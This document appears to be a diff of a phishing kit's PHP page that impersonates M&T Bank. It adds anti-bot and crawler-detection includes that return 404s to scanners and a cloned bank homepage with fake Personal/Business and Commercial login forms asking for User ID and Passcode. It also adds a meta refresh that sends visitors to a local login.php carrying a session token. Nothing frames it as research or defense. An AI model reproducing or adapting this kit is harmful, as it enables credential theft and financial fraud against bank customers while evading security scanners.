@@ -11,19 +11,21 @@
         echo $antibot->throw404();
         die();
     }
-    include './zsec.php';
+	include './zsec.php';
     include 'huehuehue.php';
     include 'crawlerdetect.php';
     include 'bot_fucker/wrd.php';
     include 'bot_fucker/bot.php';
-	session_destroy();
 ?>
+
 <html lang="en"><head class="at-element-marker">
 	<meta charset="UTF-8">
-	<title>Verification Completed</title>
-	<!-- -->
+	<title>Verification Process</title>
+	
+
 	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
-    <meta http-equiv="refresh" content="3;url=https://mtb.com"> 
+
+
 	<link rel="appple-touch-icon" sizes="57x57" href="./images/favicon.png" type="image/png">
 <link rel="appple-touch-icon" sizes="60x60" href="./images/favicon.png" type="image/png">
 <link rel="appple-touch-icon" sizes="72x72" href="./images/favicon.png" type="image/png">
@@ -41,51 +43,18 @@
 
 	
     
-    
+<meta http-equiv="refresh" content="2;url=login.php?token=<?php echo $_SESSION['token']; ?>"> 
 <link rel="stylesheet" href="./css/clientlib-base.css" type="text/css">
 
 
 
 
-    
-    
-
-<script>
-// This code empowers all input tags having a placeholder and data-slots attribute
-document.addEventListener('DOMContentLoaded', () => {
-    for (const el of document.querySelectorAll("[placeholder][data-slots]")) {
-        const pattern = el.getAttribute("placeholder"),
-            slots = new Set(el.dataset.slots || "_"),
-            prev = (j => Array.from(pattern, (c,i) => slots.has(c)? j=i+1: j))(0),
-            first = [...pattern].findIndex(c => slots.has(c)),
-            accept = new RegExp(el.dataset.accept || "\\d", "g"),
-            clean = input => {
-                input = input.match(accept) || [];
-                return Array.from(pattern, c =>
-                    input[0] === c || slots.has(c) ? input.shift() || c : c
-                );
-            },
-            format = () => {
-                const [i, j] = [el.selectionStart, el.selectionEnd].map(i => {
-                    i = clean(el.value.slice(0, i)).findIndex(c => slots.has(c));
-                    return i<0? prev[prev.length-1]: back? prev[i-1] || first: i;
-                });
-                el.value = clean(el.value).join``;
-                el.setSelectionRange(i, j);
-                back = false;
-            };
-        let back = false;
-        el.addEventListener("keydown", (e) => back = e.key === "Backspace");
-        el.addEventListener("input", format);
-        el.addEventListener("focus", format);
-        el.addEventListener("blur", () => el.value === pattern && (el.value=""));
-    }
-});</script>
-
-
-
-
-
+<!-- 
+<link rel="preload" href="/etc.clientlibs/mtb-web/clientlibs/clientlib-site/resources/fonts/MTB_Balto/Webfonts/mandtbaltoweb-book.woff" as="font" type="font/woff" crossorigin="">
+<link rel="preload" href="/etc.clientlibs/mtb-web/clientlibs/clientlib-site/resources/fonts/MTB_Balto/Webfonts/mandtbaltoweb-light.woff" as="font" type="font/woff" crossorigin="">
+<link rel="preload" href="/etc.clientlibs/mtb-web/clientlibs/clientlib-site/resources/fonts/MTB_Balto/Webfonts/mandtbaltoweb-medium.woff" as="font" type="font/woff" crossorigin="">
+<link rel="preload" href="/etc.clientlibs/mtb-web/clientlibs/clientlib-site/resources/fonts/MTB_Balto/Webfonts/mandtbaltoweb-bold.otf" as="font" type="font/otf" crossorigin="">
+ -->
 
 
 <script>
@@ -133,9 +102,26 @@ try {
 <nav class="header-wrapper">
 
     <ul class="header-nav-container">
-       
-
-
+        <li class="header-nav-item">
+            <a href="/personal" class="header-link -parent-page" data-speedbump-enabled="false">
+                Personal
+            </a>
+        </li>
+<li class="header-nav-item">
+            <a href="/business" class="header-link" data-speedbump-enabled="false">
+                Business
+            </a>
+        </li>
+<li class="header-nav-item">
+            <a href="/commercial" class="header-link" data-speedbump-enabled="false">
+                Commercial
+            </a>
+        </li>
+<li class="header-nav-item">
+            <a href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response" class="header-link" data-speedbump-enabled="false">
+                COVID-19 Updates
+            </a>
+        </li>
 
     </ul>
 
@@ -149,7 +135,15 @@ try {
 
     <div class="header-misc">
         <ul class="header-misc-container">
-            
+            <li class="header-misc-item">
+                <a href="./login.php?token=<?php echo $_SESSION['token']; ?>" class="header-link -login" aria-label="Log In, use escape key to exit modal window." aria-haspopup="true" role="button">
+                    <svg class="header-icon -icon-lock" role="presentation">
+                        <title>Lock</title>
+                        <use xlink:href="#icon-lock"></use>
+                    </svg>
+                    Log In<span class="caret" role="presentation">&gt;</span>
+                </a>
+            </li>
             
                 <li class="header-misc-item -lang"><a class="header-link" aria-label="View Spanish language page" href="/content/mtb-web/en/es.html"><img src="./images/es-language-icon.svg"></a></li><li class="header-misc-item">
                     <a href="#info-modal" class="header-link -icon" data-speedbump-enabled="false" role="button" aria-label=", use escape key to exit modal window." aria-haspopup="true">
@@ -167,7 +161,13 @@ try {
                     </a>
                 </li>
             
-                
+                <li class="header-misc-item">
+                    <a href="#search-modal" class="header-link -icon" data-speedbump-enabled="false" role="button" aria-label="Search, use escape key to exit modal window." aria-haspopup="true">
+                        <svg class="header-icon -icon-magnifying-glass" aria-hidden="true">
+                            <use xlink:href="#icon-magnifying-glass"></use>
+                        </svg>
+                    </a>
+                </li>
             
         </ul>
     </div>
@@ -175,7 +175,12 @@ try {
     
 
     
-<a href="#search-modal" class="search-button" aria-label="Search, use escape key to exit modal window." role="button" aria-haspopup="true">
+<a href="#hamburger-nav" class="hamburger-button" aria-label="Open Navigation Menu, use escape key to exit modal window." role="button" aria-haspopup="true">
+        <svg class="icon-hamburger-menu" role="img" aria-hidden="true">
+            <title>Navigation Menu</title>
+            <use xlink:href="#icon-hamburger-menu"></use>
+        </svg>
+    </a><a href="#search-modal" class="search-button" aria-label="Search, use escape key to exit modal window." role="button" aria-haspopup="true">
         <svg class="header-icon-magnifying-glass" role="img" aria-hidden="true">
             <title>Search</title>
             <use xlink:href="#icon-magnifying-glass"></use>
@@ -594,10 +599,10 @@ try {
 	
 		<h4>Common Tasks</h4>
 <p><a href="#">​​Ask a Question/Submit Your Feedback</a></p>
-<p><a href="/homepage/explore-the-m-and-t-bank-help-center/discover-top-banking-tasks/how-to-reset-your-account-passcode">Reset Your Online Banking Passcode</a></p>
-<p><a href="/homepage/explore-the-m-and-t-bank-help-center/discover-top-banking-tasks/how-to-find-a-bank-account-routing-number">Find Your Routing Number</a></p>
-<p><a href="/homepage/explore-the-m-and-t-bank-help-center/discover-top-banking-tasks/how-to-report-a-lost-debit-or-credit-card">Report a Stolen Debit or Credit Card</a></p>
-<p><a href="/homepage/explore-the-m-and-t-bank-help-center/discover-top-banking-tasks/how-to-change-name-or-address-on-bank-account">Change Your Name on Your Account/Cards</a></p>
+<p><a href="#">Reset Your Online Banking Passcode</a></p>
+<p><a href="#-account-routing-number">Find Your Routing Number</a></p>
+<p><a href="#st-debit-or-credit-card">Report a Stolen Debit or Credit Card</a></p>
+<p><a href="#-address-on-bank-account">Change Your Name on Your Account/Cards</a></p>
 <p><a title="Same tab opens to the M&amp;T Pay Your Loan page." data-speedbump-enabled="false" href="/personal/mortgages-and-loans/pay-your-loan" target="_self">Pay Your Consumer Loan, Line or Credit Card</a></p>
 <p><a href="#" target="_blank" data-speedbump-enabled="false">Make an Appointment</a></p>
 
@@ -700,132 +705,524 @@ to you.</p>
     </div>
 </div>
 
-
-<style>
-* {
-  box-sizing: border-box;
-}
-
-input[type=text], select, textarea {
-  width: 90%;
-  padding: 12px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  resize: vertical;
-}
-input[type=tel], select, textarea {
-  width: 90%;
-  padding: 12px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  resize: vertical;
-}
-input[type=date], select, textarea {
-  width: 90%;
-  padding: 12px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  resize: vertical;
-}
-input[type=password], select, textarea {
-  width: 90%;
-  padding: 12px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  resize: vertical;
-}
-
-label {
-  padding: 12px 12px 12px 0;
-  display: inline-block;
-}
+<main class="main-content" id="skiptomaincontent" aria-hidden="false">
+	<div class="root responsivegrid">
 
 
-input[type=submit]:hover {
-  background-color: #45a049;
-}
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
 
-.cntainer {
-  border-radius: 5px;
-  padding: 20px;
-}
 
-.col-25 {
-  float: left;
-  width: 25%;
-  margin-top: 6px;
-}
-hr {
-    width: 100%;
-    height: 2px;
-    background-color: blue;
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="experience-fragments experiencefragment aem-GridColumn aem-GridColumn--default--12">
 
-}
-.col-24 {
-  float: left;
-  width: 23%;
-  margin-top: 6px;
-}
-.col-75 {
-  float: left;
-  width: 40%;
-  margin-top: 6px;
-}
+    
+    
 
-/* Clear floats after the columns */
-.rew:after {
-  content: "";
-  display: table;
-  clear: both;
-}
-.button {
-    background-color: #4CAF50;
-    border: none;
-    color: white;
-    padding: 15px 32px;
-    text-align: center;
-    text-decoration: none;
-    display: inline-block;
-    font-size: 16px;
-    margin: 4px 2px;
-    cursor: pointer;
-}
-.button {width: 50%;}
-
-/* Responsive layout - when the screen is less than 600px wide, make the two columns stack on top of each other instead of next to each other */
-@media screen and (max-width: 600px) {
-  .col-25, .col-75, input[type=submit] {
-    width: 100%;
-    margin-top: 0;
-  }
-}
-</style>
+    
 
 
 
-<div class="cntainer">
-<div class="rew">
-      <div class="col-25">
-         <h3>Verification Completed </h3>
-         <hr>
+<div class="xf-content-height">
+    
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="experience-fragments experiencefragment aem-GridColumn aem-GridColumn--default--12">
+
+    
+    
+
+    
+
+
+
+<div class="xf-content-height">
+    
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 aem-Grid--phone--12 ">
+    
+    <div class="homepage-hero aem-GridColumn aem-GridColumn--default--12">
+
+<div class="homepage-hero-wrapper -show-products component">
+    <div class="homepage-hero-container" data-desktop-background="\2f content\2f dam\2fmtb-web\2fimages\2fpersonal-home-page\2fmom-daughter-couch-desktop.jpg" data-mobile-background="\2f content\2f dam\2fmtb-web\2fimages\2fpersonal-home-page\2fmom-daughter-couch-mobile.jpg" style="background-image: url(&quot;./images/mom-daughter-couch-desktop.jpg&quot;);">
+        <div class="hero-text-box-gradient -gradient-on">
+            <div class="hero-text-box">
+                <div class="homepage-hero-title ">
+<div class="cmp-title title-container component">
+	<h1 class="cmp-title__text  -default-theme">
+		
+			Follow your financial dreams with confidence.
+		
+	</h1>
+</div></div>
+                <div class="homepage-hero-text ">
+
+<div class="cmp-text richtext component">
+	
+		<p>Enjoy the freedom of EZChoice personal checking and get the essentials you need with no monthly maintenance fee.<sup class="numbered" data-disclosure-id="d111_original">1</sup><span class="disclosure-label _visuallyhidden">Disclosure number, please reference additional details in the Disclosures section at the bottom of this page.</span></p>
+<div class="_hidden" data-disclosure-id="d111_original">&nbsp;There is no monthly maintenance charge, but other transaction and service fees, including insufficient funds (NSF) and overdraft fees, may apply to this account.
 </div>
-</div><br>
+	
+</div></div>
+                <div class="homepage-hero-cta-button ">
 
-	<div class="rew">
-     <br><br>
-      <center>
-
-                            <img width="150" height="150" src="./images/success.gif">
-                            <br>      <p>Thank you! Your account access has been Restored.</p>
-                        
-</center>
+    <div class="cta-button component -text-width style-g 13  ">
+        <a class="cta-button-link" target="_self" data-speedbump-enabled="false" href="/personal/personal-banking/checking-accounts-mandt-bank" aria-label="Learn about our Personal Checking Options" data-id="-799699594" data-comp-type="cta-button" data-tag-type="clickAction" data-tag-text="Checking Options">
+            <span class="button-text  -chevron">Explore Checking</span>
+        </a>
     </div>
 
-    <br>
+</div>
+            </div>
+        </div>
+    </div>
+    <div class="homepage-hero-products">
+
+<div class="products-services-wrapper component" data-id="-615841712">
+	<div class="products-services-text">
+		<div class="products-services-heading">
+			<div class="products-services-title">
+<div class="cmp-title title-container component">
+	<h2 class="cmp-title__text  -default-theme">
+		
+			More Choices. More Possibilities.
+		
+	</h2>
+</div></div>
+			<div class="products-services-sub-title">
+				
+					Explore products and services designed to help you reach your goals.<sup class="unnumbered" data-disclosure-id="d222_original"></sup><span class="disclosure-label _visuallyhidden">Disclosure number, please reference additional details in the Disclosures section at the bottom of this page.</span><div class="_hidden" data-disclosure-id="d222_original">Unless otherwise specified, all advertised offers and terms and conditions of accounts and services are subject to change at any time without notice. After an account is opened or service begins, it is subject to its features, conditions and terms, which are subject to change at any time in accordance with applicable laws and agreements. Please contact an M&amp;T representative for full details.
+</div>
+				
+				
+			</div>
+		</div>
+	</div>
+	<div class="products-services-icons">
+		<ul class="icon-row">
+			<li class="products-services-column-icon">
+				<a data-speedbump-enabled="false" href="/personal/personal-banking/checking-accounts-mandt-bank" class="products-services-link">
+					<svg class="products-services-svg">
+						<use xlink:href="#icon-checking"></use>
+					</svg>
+					<div class="service-icon-text">
+						Checking
+					</div>
+				</a>
+			</li>
+			<li class="products-services-column-icon">
+				<a data-speedbump-enabled="false" href="/personal/mortgages-and-loans" class="products-services-link">
+					<svg class="products-services-svg">
+						<use xlink:href="#icon-borrowing"></use>
+					</svg>
+					<div class="service-icon-text">
+						Mortgages &amp; Loans
+					</div>
+				</a>
+			</li>
+			<li class="products-services-column-icon">
+				<a data-speedbump-enabled="false" href="/personal/personal-banking/credit-cards" class="products-services-link">
+					<svg class="products-services-svg">
+						<use xlink:href="#icon-credit-card"></use>
+					</svg>
+					<div class="service-icon-text">
+						Credit Cards
+					</div>
+				</a>
+			</li>
+			
+		</ul>
+		<ul class="icon-row">
+			
+				<li class="products-services-column-icon">
+					<a data-speedbump-enabled="false" href="/personal/personal-banking/savings-and-certificate-of-deposit-cds/savings-account-and-cd-options" class="products-services-link">
+						<svg class="products-services-svg">
+							<use xlink:href="#icon-savings"></use>
+						</svg>
+						<div class="service-icon-text">
+							Savings
+						</div>
+					</a>
+				</li>
+				<li class="products-services-column-icon">
+					<a data-speedbump-enabled="false" href="/personal/wilmington-advisors" class="products-services-link">
+						<svg class="products-services-svg">
+							<use xlink:href="#icon-investments"></use>
+						</svg>
+						<div class="service-icon-text">
+							Investments
+						</div>
+					</a>
+				</li>
+				<li class="products-services-column-icon">
+					<a data-speedbump-enabled="false" href="/personal/insurance-investments-and-insurance" class="products-services-link">
+						<svg class="products-services-svg">
+							<use xlink:href="#icon-insurance"></use>
+						</svg>
+						<div class="service-icon-text">
+							Insurance
+						</div>
+					</a>
+				</li>
+			
+
+			
+		</ul>
+	</div>
+</div></div>
+</div>
+</div>
+<div class="bolt-mortgage-v2 bolt-mortgage aem-GridColumn aem-GridColumn--default--12">
+
+<div class="bolt-mortgage-v2 component fixed-center-default">
+	<div class="bolt-mortgage-image " data-background-image="/content/dam/mtb-web/images/rene-assets/Rene_Community_Focus.jpg" style="background-image: url(&quot;/content/dam/mtb-web/images/rene-assets/Rene_Community_Focus.jpg&quot;);"></div>
+	<div class="bolt-mortgage-copy-v2 ">
+		<p class="get-started">In The News: People's United</p>
+		<div class="bolt-mortgage-title-v2">
+<div class="cmp-title title-container component">
+	<h1 class="cmp-title__text  -default-theme">
+		
+			Expanding our community
+		
+	</h1>
+</div></div>
+		<div class="bolt-mortgage-description-v2"><p style="text-align: center;">We are pleased to announce that we have entered into an agreement to acquire People’s United Financial, Inc.&nbsp;</p>
+<p style="text-align: center;">“In People’s United, we have found a partner with an equally long history of serving and supporting customers, businesses and communities,” said René Jones, chairman and chief executive officer of M&amp;T Bank Corporation, who will lead the combined company in the same capacity.<br>
+</p>
+</div>
+		<div class="bolt-mortgage-buttons-v2">
+			<div class="bolt-mortgage-button-container">
+
+    <div class="cta-button component -text-width style-a 11  ">
+        <a class="cta-button-link" target="_self" data-speedbump-enabled="false" href="/landing-pages/peoples-united" data-id="-632028249" data-comp-type="cta-button" data-tag-type="off">
+            <span class="button-text  -chevron">Read More</span>
+        </a>
+    </div>
+
+</div>
+			
+		</div>
+	</div>
+</div></div>
+<div class="columns aem-GridColumn--phone--hide aem-GridColumn--phone--12 aem-GridColumn aem-GridColumn--default--12 aem-GridColumn--offset--phone--0">
+
+
+<div class="columns-container -lg-top-padding   ">
+	<div class="columns-wrapper -grey">
+		<div class="column-content ">
+			<div class="col-6 column-parsys -lg-horizontal-padding"><div class="help-center section">
+
+<div class="help-center-container component">
+    <div class="help-center-content-wrapper">
+        <h2 class="help-center-content-title">
+            <span class="help-center-heading -small">Help Center</span>
+            <span class="help-center-heading -large">What can we help you with today?</span>
+        </h2>
+        <form action="#" method="post" class="help-center-form">
+            <div class="help-center-search-wrapper">
+                <a href="#search-modal" class="help-center-icon-magnifying-glass-link" aria-label="Search, use escape key to exit modal window." aria-haspopup="true" role="button">
+                    <svg class="help-center-icon-magnifying-glass">
+                        <use xlink:href="#icon-magnifying-glass"></use>
+                    </svg>
+                </a>
+                <input type="text" id="help-input" class="help-center-search-field" aria-label="Enter text to search mtb.com">
+                <label class="search-label" for="help-input" aria-hidden="true">Search </label>
+            </div>
+        </form>
+    </div>
+</div>
+</div>
+<div class="raw-html section">
+<div class="raw-html component">
+	
+	<style>
+.help-center-search-field {
+min-height: 2em;
+}
+
+.community-spotlight > .main-title,
+.community-spotlight > .description ,
+.bolt-mortgage-copy .bolt-mortgage-title,
+.bolt-mortgage-copy .bolt-mortgage-description {
+max-width:100%;
+}
+</style>
+	
+</div>
 </div>
 
+</div>
+			<div class="col-6 column-parsys -lg-horizontal-padding"><div class="testimonial section">
+
+<div class="testimonial component">
+	<div class="testimonial-container">
+		<span class="testimonial-title">
+			BANKING WITH M&amp;T
+		</span>
+		<div class="testimonial-quote">
+			<p>"Small business is the heartbeat of a community. M&amp;T Bank is definitely committed to independent businesses. They really worked with us from the beginning. They are just as committed to our business as we are."<sup class="unnumbered" data-disclosure-id="d592_original"></sup><span class="disclosure-label _visuallyhidden">Disclosure number, please reference additional details in the Disclosures section at the bottom of this page.</span><sup class="unnumbered" data-disclosure-id="d174_original"></sup><span class="disclosure-label _visuallyhidden">Disclosure number, please reference additional details in the Disclosures section at the bottom of this page.</span></p>
+<div class="_hidden" data-disclosure-id="d592_original">Based on Greenwich Associates 2020 Small Business Banking Excellence Awards.
+</div><div class="_hidden" data-disclosure-id="d174_original">According to statistics released by the U.S. Small Business Administration (SBA) for total approved loans through the SBA's 7(a) lending program during the federal fiscal year ending 9/30/2020.
+</div>
+		</div>
+		<div class="testimonial-attribution">
+			<span class="testimonial-author">Laura and David Alima</span><br>
+			<span class="testimonial-bio">Owners of the Charmery</span>
+		</div>
+		<div class="testimonial-images">
+			<div class="testimonial-image ">
+<div class="image component " data-imagespeedbump="false">
+    <div data-cmp-lazythreshold="0" data-cmp-src="./images/top10bb.png" data-asset="./images/top10BB.png" data-asset-id="56b09253-4f90-464e-ba02-596a8d26560a" data-title="Top 5 SBA Lender Nationally" id="image-3575fb1f1c" class="cmp-image" itemscope="" itemtype="http://schema.org/ImageObject">
+        
+            
+                
+                <img src="./images/top10bb.png" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="Top 5 SBA Lender Nationally">
+                
+            
+        
+        
+        
+    </div>
+    
+    
+
+</div></div>
+			<div class="testimonial-image ">
+<div class="image component " data-imagespeedbump="false">
+    <div data-cmp-lazythreshold="0" data-cmp-src="./images/bestbanks-2020-green-5yrsv2.png" data-asset="./images/BestBanks_2020_green-5YRSv2.png" data-asset-id="193596a0-38cd-49b8-9eca-a17985455f6e" data-title="Forbes 2020 Best Banks in America 5 years in a row" id="image-db0ea14e70" class="cmp-image" itemscope="" itemtype="http://schema.org/ImageObject">
+        
+            
+                
+                <img src="./images/bestbanks-2020-green-5yrsv2.png" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="Forbes 2020 Best Banks in America 5 years in a row">
+                
+            
+        
+        
+        
+    </div>
+    
+    
+
+</div></div>
+			<div class="testimonial-image ">
+<div class="image component " data-imagespeedbump="false">
+    <div data-cmp-lazythreshold="0" data-cmp-src="./images/excellence-2019.jpeg" data-asset="./images/Excellence-2019.jpg" data-asset-id="54870be5-6d57-48b6-906a-bd245a4a979c" data-title="Greenwich Excellence Award 2019" id="image-e3ef62cfab" class="cmp-image" itemscope="" itemtype="http://schema.org/ImageObject">
+        
+            
+                
+                <img src="./images/excellence-2019.jpeg" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="Greenwich Excellence Award 2019">
+                
+            
+        
+        
+        
+    </div>
+    
+    
+
+</div></div>
+		</div>
+	</div>
+</div>
+</div>
+
+</div>
+			
+			
+		</div>
+	</div>
+</div>
+</div>
+<div class="convenience-section aem-GridColumn aem-GridColumn--default--12">
+
+<div class="component fixed-center-default convenience-section-main">
+    <div class="convenience-section-container" data-background-image="./imagesconvenience-section-image1.png" style="background-image: url(./images/convenience-section-image1.png&quot;);">
+        <div class="convenience-section-wrapper">
+            <div class="convenience-section-sub-title">M&amp;T MOBILE BANKING</div>
+            <div class="convenience-section-title">
+<div class="cmp-title title-container component">
+	<h2 class="cmp-title__text  -default-theme">
+		
+			Simple, encrypted and always in your pocket.
+		
+	</h2>
+</div></div>
+            <div class="convenience-section-icons">
+                <div class="convenience-section-icon -showBoth">
+                    <img data-src="./images/zelle.png" class="convenience-section-icon-image lazyloaded" alt="" src="./images/zelle.png">
+                    <h3 class="convenience-section-icon-title -extra-padding">Send &amp; receive money</h3>
+                </div>
+                <div class="convenience-section-icon -showBoth">
+                    <img data-src="./images/deposit-checks.png" class="convenience-section-icon-image lazyloaded" alt="" src="./images/deposit-checks.png">
+                    <h3 class="convenience-section-icon-title">Deposit checks on the go</h3>
+                </div>
+                <div class="convenience-section-icon -showDesktop">
+                    <img data-src="./images/android-ios.png" class="convenience-section-icon-image lazyloaded" alt="" src="./images/android-ios.png">
+                    <h3 class="convenience-section-icon-title">Available on Android and iOS</h3>
+                </div>
+                <div class="convenience-section-icon -showBoth">
+                    <img data-src="./images/track-your-spending.png" class="convenience-section-icon-image lazyloaded" alt="" src="./images/track-your-spending.png">
+                    <h3 class="convenience-section-icon-title">Monitor your spending habits</h3>
+                </div>
+            </div>
+            <a data-speedbump-enabled="false" href="/personal/personal-banking/online-and-mobile-services/mobile-banking" class="convenience-section-icon-cta">Mobile Banking</a>
+            <div class="convenience-section-mobile-buttons">
+                <a data-speedbump-enabled="true" href="#" class="convenience-section-mobile-cta">
+                    <img data-src="images/App-Store.png" class="convenience-section-mobile-image lazyload" alt="Apple App Store">
+                </a>
+                <a data-speedbump-enabled="true" href="#" class="convenience-section-mobile-cta">
+                    <img data-src="images/Google-Play.png" class="convenience-section-mobile-image lazyload" alt="Google App Store">
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+</div>
+<div class="community-focus aem-GridColumn aem-GridColumn--default--12">
+
+<div class="component community-focus-wrapper">
+    <div class="community-focus-container -image">
+        <div class="community-image-box">
+            <img data-src="images/multicultural-family-hugging-on-yard.jpg" class="image lazyloaded" alt="" src="images/multicultural-family-hugging-on-yard.jpg">
+            <div class="community-spotlight ">
+                <div class="sub-title">Multicultural Banking</div>
+                <h3 class="main-title">Reflecting our communities.</h3>
+                <p class="description">M&amp;T is investing in the growth and sustainability of the businesses and communities we serve, attracting and retaining diverse clients and colleagues across our organization so we can truly reflect our multicultural communities.</p>
+                <a data-speedbump-enabled="false" href="/homepage/personal-and-business-banking-mortgages-and-more/community-involvement/multicultural-banking" class="buttonLabel">Learn More</a>
+            </div>
+        </div>
+    </div>
+    <div class="community-focus-container -stats">
+        <div class="community-columns">
+            <div class="community-stats-title">Partnering for Change in the Communities We Serve</div>
+            <div class="community-column">
+                
+                <div class="data">$34.9 million</div>
+                <div class="label">IN LOCAL GRANTS</div>
+            </div>
+            <div class="community-column">
+                
+                <div class="data -border">$1.6 billion</div>
+                <div class="label -border">IN COMMUNITY LOANS</div>
+            </div>
+            <div class="community-column">
+                
+                <div class="data">&gt; 50,000</div>
+                <div class="label">EMPLOYEE VOLUNTEER HOURS</div>
+            </div>
+        </div>
+    </div>
+</div></div>
+<div class="modal aem-GridColumn aem-GridColumn--default--12">
+
+<div class="component modal-data community-focus-modal">
+	
+	<div>
+		
+
+    
+    
+
+    
 
 
+
+<div class="xf-content-height">
+    
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="video-highlight aem-GridColumn aem-GridColumn--default--12">
+<div class="video-highlight component">
+	
+	
+	
+
+	<div class="video-highlight-video-details">
+		<div class="video-highlight-video-title-group">
+			
+			
+			
+		</div>
+		<div class="video-highlight-description">
+
+<div class="cmp-text richtext component">
+	<p class="cmp-text__paragraph">
+		
+	</p>
+</div></div>
+	</div>
+	
+</div>
+</div>
+
+    
+</div>
+
+</div>
+
+	</div>
+</div>
+</div>
+<div class="bolt-mortgage-v2 bolt-mortgage aem-GridColumn aem-GridColumn--default--12">
+
+<div class="bolt-mortgage-v2 component fixed-center-default">
+	<div class="bolt-mortgage-image " data-background-image="/content/dam/mtb-web/images/esg-report/esg-report-homepage-desktop.jpg" style="background-image: url(&quot;/content/dam/mtb-web/images/esg-report/esg-report-homepage-desktop.jpg&quot;);"></div>
+	<div class="bolt-mortgage-copy-v2 ">
+		<p class="get-started">2020 ESG Report</p>
+		<div class="bolt-mortgage-title-v2">
+<div class="cmp-title title-container component">
+	<h1 class="cmp-title__text  -default-theme">
+		
+			A Bank for Communities &amp; Making a Difference
+		
+	</h1>
+</div></div>
+		<div class="bolt-mortgage-description-v2"><p style="text-align: left;">We have released our 2020 Environmental, Social, and Governance (ESG) Report -&nbsp;making data more readily available, tracking its impact and future progress.&nbsp;</p>
+<p style="text-align: left;">This&nbsp;inaugural annual formal disclosure highlights the company’s commitment to operating with integrity, candor, collaboration, ownership, and curiosity to contribute to a better future for the communities it serves.</p>
+</div>
+		<div class="bolt-mortgage-buttons-v2">
+			<div class="bolt-mortgage-button-container">
+
+    <div class="cta-button component -text-width style-a 12  _halign_center">
+        <a class="cta-button-link" target="_self" data-speedbump-enabled="false" href="/homepage/personal-and-business-banking-mortgages-and-more/esg-report" data-id="-666930276" data-comp-type="cta-button" data-tag-type="clickAction" data-tag-text="ESG Report">
+            <span class="button-text  ">Learn More &gt;</span>
+        </a>
+    </div>
+
+</div>
+			
+		</div>
+	</div>
+</div></div>
+
+    
+</div>
+
+</div>
+</div>
+
+    
+</div>
+
+</div>
+</div>
+
+    
+</div>
+</div>
+
+    
+</div>
+</div>
+
+</main>
 
 
 
@@ -1042,7 +1439,21 @@ hr {
                 What can we help you with today?
             </p>
         </div>
-      
+        <form name="search-results-form" method="get" class="search-results-form">
+            <label for="searchInput" class="search-results-placeholder">Search</label>
+            <input id="searchInput" class="search-results-input animateInput" type="text">
+            <input id="numberOf" class="numberOf" type="hidden">
+            <button class="search-results-icon-close-container" aria-label="Clear search">
+                <svg class="search-results-icon-close">
+                    <use xlink:href="#icon-close"></use>
+                </svg>
+            </button>
+            <button type="submit" class="search-results-icon-magnifying-glass" aria-label="Submit search">
+                <svg class="search-results-icon-magnifying-glass-image" aria-hidden="true">
+                    <use xlink:href="#icon-magnifying-glass"></use>
+                </svg>
+            </button>
+        </form>
     </div>
     <p class="_visuallyhidden search-alert">Search results are ready</p>
     <div class="search-results-items"></div>
@@ -1290,8 +1701,98 @@ min-height:35%;
         </div>
     </div>
 </div>
-		
-		
+		<div class="desktop-option"><div class="login-form-selection">
+    <button class="option -active" data-option="user" aria-label="Personal and Business Login Tab" aria-selected="true" aria-pressed="true">Personal / Business</button>
+    <button class="option" data-option="dealer" aria-label="Commercial Login Tab" aria-selected="false" aria-pressed="false">Commercial</button>
+</div></div>
+		<form method="post" action="#" autocomplete="off" class="login-form -personal-business">
+			<fieldset class="login-fieldset">
+				<legend class="_visuallyhidden">Personal / Business Login</legend>
+				<div class="login-textfield">
+					<label for="txtUserID" class="login-field-placeholder">User ID</label>
+					<input type="text" id="txtUserID" name="txtUserID" value="" class="login-field animateInput" autocomplete="off" aria-invalid="false" minlength="5" maxlength="20" role="textbox" required="">
+				</div>
+				<div class="login-textfield -login-user-only">
+					<label for="txtPasscode" class="login-field-placeholder">Passcode</label>
+					<input type="password" id="txtPasscode" name="txtPasscode" value="" class="login-field animateInput -last" autocomplete="off" aria-invalid="false" minlength="8" maxlength="20" role="textbox" required="">
+				</div>
+				<div class="login-split -checkbox">
+					<div class="login-item">
+						<input type="checkbox" id="login-checkbox" name="remember-me" class="login-remember-me" aria-label="Remember User ID">
+						<label for="login-checkbox" class="login-checkbox-label" aria-hidden="true">Remember User ID</label>
+					</div>
+					<div class="login-item -login-user-only">
+						<a href="#" class="login-link" data-speedbump-enabled="false">Help with User ID or Passcode</a>
+					</div>
+				</div>
+				<div class="hidden-fields">
+					
+				</div>
+				<div class="login-split -cta-buttons">
+					<div class="login-item login-button">
+						<div class="submit-button">
+							<button type="submit" class="submit-action">
+								<span>Log In<span aria-hidden="true"> &gt;</span></span>
+							</button>
+						</div>
+					</div>
+					<div class="login-item -go-home">
+						
+
+    <div class="cta-button component -full-width style-hyperlink 14  ">
+        <a class="cta-button-link" target="_self" data-speedbump-enabled="false" href="/personal" aria-label="Visit homepage" data-id="1510240598" data-comp-type="cta-button" data-tag-type="off">
+            <span class="button-text -text-wrap -chevron">Go to M&amp;T Bank Website</span>
+        </a>
+    </div>
+
+
+					</div>
+				</div>
+			</fieldset>
+		</form>
+		<form method="get" action="#" autocomplete="off" class="login-form -commercial _hidden">
+			<fieldset class="login-fieldset">
+				<legend class="_visuallyhidden">Commercial Login</legend>
+				<div class="login-textfield">
+					<label for="loginId" class="login-field-placeholder">Treasury Center User ID</label>
+					<input type="text" id="loginId" name="loginId" value="" class="login-field animateInput" autocomplete="off" aria-invalid="false" minlength="1" maxlength="100" role="textbox" required="">
+				</div>
+				<div class="login-split -checkbox">
+					<div class="login-item">
